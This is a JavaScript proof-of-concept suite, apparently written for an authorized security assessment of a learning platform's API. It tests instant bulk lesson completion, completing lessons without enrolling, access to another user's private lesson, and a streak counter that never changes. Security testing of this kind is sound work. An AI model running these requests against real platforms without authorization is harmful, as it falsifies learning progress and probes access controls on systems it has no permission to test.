// PoC 03: Streak & Lesson Progress Abuse Test Suite
const { BASE_URL, registerTestUser, authHeaders } = require('./common');

async function testBulkLessonCompletion(user) {
  console.log('\n--- 3.1 Testing Bulk Lesson Completion (Fast Farming without Reading) ---');

  // Fetch available lessons
  const lesRes = await fetch(`${BASE_URL}/lessons`, {
    headers: authHeaders(user.accessToken)
  });
  const allLessons = await lesRes.json();
  console.log(`Found ${allLessons.length} lessons available`);

  if (allLessons.length === 0) {
    console.log('No lessons found to complete.');
    return { test: 'bulk_completion', lessonsCompleted: 0 };
  }

  // Pick up to 5 lessons
  const targetLessons = allLessons.slice(0, 5);
  const start = Date.now();
  const promises = targetLessons.map(l =>
    fetch(`${BASE_URL}/lessons/${l.id}/complete`, {
      method: 'POST',
      headers: authHeaders(user.accessToken)
    }).then(async r => {
      const text = await r.text();
      let data = null;
      try { data = JSON.parse(text); } catch { }
      return { id: l.id, status: r.status, data };
    })
  );

  const results = await Promise.all(promises);
  const duration = Date.now() - start;
  const completedCount = results.filter(r => r.status === 200).length;

  console.log(`Completed ${completedCount}/${targetLessons.length} lessons in ${duration}ms (Avg ${Math.round(duration / targetLessons.length)}ms per lesson)`);
  console.log(`VULNERABILITY CONFIRMED: No minimum reading time enforced! All lessons marked complete instantly: ${completedCount === targetLessons.length}`);

  return {
    test: 'bulk_completion_no_read_time',
    completedCount,
    durationMs: duration,
    instantPass: completedCount === targetLessons.length
  };
}

async function testCompleteUnenrolledPublicCourse(user) {
  console.log('\n--- 3.2 Testing Completing Lesson in Public Course Without Enrollment ---');

  // Find a public course
  const coursesRes = await fetch(`${BASE_URL}/courses`, {
    headers: authHeaders(user.accessToken)
  });
  const courses = await coursesRes.json();
  const publicCourse = courses.find(c => c.visibility === 'public');

  if (!publicCourse) {
    console.log('No public course found.');
    return { test: 'complete_unenrolled', publicCourseFound: false };
  }

  console.log(`Public course found: "${publicCourse.title}" (${publicCourse.id})`);

  // Check enrollment
  const isEnrolled = publicCourse.enrolled || false;
  console.log(`User enrolled in this public course? ${isEnrolled}`);

  // Fetch course details to get lessons
  const detailRes = await fetch(`${BASE_URL}/courses/${publicCourse.id}`, {
    headers: authHeaders(user.accessToken)
  });
  const detail = await detailRes.json();
  const firstLesson = detail.chapters?.[0]?.lessons?.[0];

  if (!firstLesson) {
    console.log('No lesson found in public course.');
    return { test: 'complete_unenrolled', lessonFound: false };
  }

  // Attempt completing lesson without enrolling
  const compRes = await fetch(`${BASE_URL}/lessons/${firstLesson.id}/complete`, {
    method: 'POST',
    headers: authHeaders(user.accessToken)
  });
  const compData = await compRes.json();
  console.log(`Complete lesson status without enrollment: ${compRes.status}, message: ${compData.message}`);

  const completedWithoutEnrollment = compRes.status === 200;
  console.log(`VULNERABILITY CONFIRMED: Completed lesson of course without enrollment: ${completedWithoutEnrollment}`);

  return {
    test: 'complete_unenrolled_public_course',
    courseId: publicCourse.id,
    lessonId: firstLesson.id,
    completedWithoutEnrollment
  };
}

async function testCompletePrivateCourseOfAnotherUser(user1, user2) {
  console.log('\n--- 3.3 Testing IDOR / Access Control on Private Course of Another User ---');

  // User 1 uses their personal workspace course (visibility: personal)
  const personalCourseId = user1.personalWorkspaceCourseId;

  const chRes = await fetch(`${BASE_URL}/courses/${personalCourseId}/chapters`, {
    method: 'POST',
    headers: authHeaders(user1.accessToken),
    body: JSON.stringify({ title: 'Private Chapter 1', sortOrder: 1 })
  });
  const chapter = await chRes.json();

  const lesRes = await fetch(`${BASE_URL}/chapters/${chapter.id}/lessons`, {
    method: 'POST',
    headers: authHeaders(user1.accessToken),
    body: JSON.stringify({
      title: 'Private Lesson 1',
      plainText: 'Secret lesson content',
      estimatedMinutes: 10
    })
  });
  const lesson = await lesRes.json();

  // User 2 attempts to mark User 1's private lesson complete
  const compRes = await fetch(`${BASE_URL}/lessons/${lesson.id}/complete`, {
    method: 'POST',
    headers: authHeaders(user2.accessToken)
  });
  console.log(`User 2 complete User 1's private lesson status: ${compRes.status} (expected 403 Forbidden)`);

  return {
    test: 'idor_private_course_completion',
    blockedForbidden: compRes.status === 403
  };
}

async function testStreakIntegrity(user) {
  console.log('\n--- 3.4 Testing StreakDays Integrity & Progression ---');

  // Check initial streak
  const initialMeRes = await fetch(`${BASE_URL}/auth/me`, {
    headers: authHeaders(user.accessToken)
  });
  const initialMe = await initialMeRes.json();
  const initialStreak = initialMe.streakDays;
  console.log(`Initial streakDays: ${initialStreak}`);

  // Complete multiple lessons & reviews
  // 1. Complete an onboarding step
  await fetch(`${BASE_URL}/workspace/onboarding`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({ step: 4, completeActivation: true })
  });

  // Check streak again
  const afterMeRes = await fetch(`${BASE_URL}/auth/me`, {
    headers: authHeaders(user.accessToken)
  });
  const afterMe = await afterMeRes.json();
  console.log(`StreakDays after onboarding & activity: ${afterMe.streakDays}`);

  const streakFrozen = afterMe.streakDays === initialStreak;
  console.log(`VULNERABILITY / DESIGN FLAW CONFIRMED: StreakDays is completely static/hardcoded and never increases on user activity: ${streakFrozen}`);

  return {
    test: 'streak_days_frozen',
    initialStreak,
    finalStreak: afterMe.streakDays,
    streakNeverIncrements: streakFrozen
  };
}

async function main() {
  console.log('=== STARTING POC-03: STREAK & PROGRESS ABUSE SUITE ===');
  const user1 = await registerTestUser(`prog-user1-${Date.now().toString().slice(-4)}`);
  const user2 = await registerTestUser(`prog-user2-${Date.now().toString().slice(-4)}`);

  const r1 = await testBulkLessonCompletion(user1);
  const r2 = await testCompleteUnenrolledPublicCourse(user1);
  const r3 = await testCompletePrivateCourseOfAnotherUser(user1, user2);
  const r4 = await testStreakIntegrity(user1);

  console.log('\n=== SUMMARY OF POC-03 FINDINGS ===');
  console.log(JSON.stringify({ r1, r2, r3, r4 }, null, 2));
}

main().catch(err => {
  console.error('Fatal error in poc-03:', err);
  process.exit(1);
});
